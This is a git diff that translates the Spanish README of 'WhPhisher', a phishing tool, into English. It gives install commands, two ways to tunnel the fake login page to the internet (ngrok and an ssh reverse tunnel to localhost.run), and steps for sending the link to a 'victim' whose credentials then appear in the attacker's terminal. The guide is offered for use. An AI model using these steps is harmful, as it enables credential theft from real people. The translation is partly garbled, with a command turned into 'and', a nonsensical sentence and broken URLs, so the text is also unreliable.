@@ -1,19 +1,19 @@
 # WhPhisher
 
-La mejor herramienta para hacer phishing con las páginas más famosas actualizadas.
+The best tool for phishing with the most famous pages updated.
 
 
-# Probado en:
+# Tested on:
 
-Termux, Kali Linux y debian
-
-
-# Pasos
-
-Para qué hayan menos probabilidades de que falle esta herramienta, se aconseja instalar la última versión de Termux, y Termux API.
+Termux, Kali Linux and debian
 
 
-# -- Como instalar --
+# Steps
+
+To make this tool less likely to fail, it is advised to install the latest version of Termux, and the Termux API.
+
+
+# -- How to install --
 
 `pkg install bash`
 
@@ -25,23 +25,23 @@ Para qué hayan menos probabilidades de que falle esta herramienta, se aconseja 
 
 `chmod +x *`
 
-`bash requisitoswh.sh`
+`bash requirementswh.sh`
 
-Esperar a que se instalen y automaticamente se inicia WhPhisher :D
-
-
-[![Virtual-Box-VM-Dib-Vpuj-JG9.png](https://i.postimg.cc/K86wfbyL/Virtual-Box-VM-Dib-Vpuj-JG9.png)](https://postimg.cc/XrgsNTq7)
-
-Elegir la página y esperar a que inicie el túneling.
-
-[![Virtual-Box-VM-pqnlsb1ey-B.png](https://i.postimg.cc/gJJMyjfj/Virtual-Box-VM-pqnlsb1ey-B.png)](https://postimg.cc/mcvNBLZW)
-
-# Solucion si no se genera el link o no funciona (2 soluciones)
-
-# - - - Solucion 1 - - -
+Wait for them to be installed and automatically start WhPhisher :D
 
 
-`Abrir nueva sesion`
+[![Virtual-Box-VM-Dib-Vpuj-JG9.png](https://i.postimg.cc/K86wfbyL/Virtual-Box-VM-Dib-Vpuj-JG9.png)](https:// postimg.cc/XrgsNTq7)
+
+Choose the page and wait for the tunneling to start.
+
+[![Virtual-Box-VM-pqnlsb1ey-B.png](https://i.postimg.cc/gJJMyjfj/Virtual-Box-VM-pqnlsb1ey-B.png)](https://postimg.cc/ mcvNBLZW)
+
+# Solution if the link is not generated or does not work (2 solutions)
+
+# - - - Solution 1 - - -
+
+
+`Open new session`
 
 `cd NgrokWh`
 
@@ -49,15 +49,15 @@ Elegir la página y esperar a que inicie el túneling.
 
 `./ngrokwh.sh`
 
-`y`
+`and`
 
 `ngrok http 8080`
 
-Compartir el link que nos generó a la víctima :D
+Share the link that generated the victim :D
 
-Ahora volvemos a la sesion principal, y si alguien puso sus datos, nos saldrán ahí :D 
+Now we return to the main session, and if someone put their data, they will appear there :D
 
--Imagenes de demstración:
+-Demonstration images:
 
 [![Screenshot-20220116-091839.png](https://i.postimg.cc/HW92dXc7/Screenshot-20220116-091839.png)](https://postimg.cc/3WWpZyZK)
 
@@ -70,11 +70,11 @@ Ahora volvemos a la sesion principal, y si alguien puso sus datos, nos saldrán 
 
 
 
-# - - - Solucion 2 - - -
+# - - - Solution 2 - - -
 
-Pasos:
+Steps:
 
-`Abrimos nueva sesión`
+`We open a new session`
 
 `cd`
 
@@ -82,22 +82,21 @@ Pasos:
 
 `ssh -R 80:localhost:8080 nokey@localhost.run`
 
-Compartir el link que se generó :D
+Share the link that was generated :D
 
-# Como debería de quedar
-- Lo verde tapa información personal 
-- La flecha amarilla apunta al link que hay que compartir
+# how it should look
+- The green covers personal information
+- The yellow arrow points to the link to be shared
 
-[![Pics-Art-12-28-12-04-12.jpg](https://i.postimg.cc/Dw0djMxM/Pics-Art-12-28-12-04-12.jpg)](https://postimg.cc/yDqZWv4m)
+[![Pics-Art-12-28-12-04-12.jpg](https://i.postimg.cc/Dw0djMxM/Pics-Art-12-28-12-04-12.jpg)]( https://postimg.cc/yDqZWv4m)
 
-# Resultado
+# Result
 
-- El link que le enviaste a la victima: 
+- The link you sent to the victim:
 
 [![chrome-NQpwa-Yi-Wxc.png](https://i.postimg.cc/mrxzN5JH/chrome-NQpwa-Yi-Wxc.png)](https://postimg.cc/k2cg7fnJ)
 
-Cuando la víctima pone sus credenciales, nos llegan en la terminal:
+When the victim puts her credentials, they arrive in the terminal:
 
-[![Virtual-Box-VM-t1m8-G0-J0-MQ.png](https://i.postimg.cc/wjj0Y7jV/Virtual-Box-VM-t1m8-G0-J0-MQ.png)](https://postimg.cc/4mjzz4t7)
-
+[![Virtual-Box-VM-t1m8-G0-J0-MQ.png](https://i.postimg.cc/wjj0Y7jV/Virtual-Box-VM-t1m8-G0-J0-MQ.png)]( https://postimg.cc/4mjzz4t7)
 
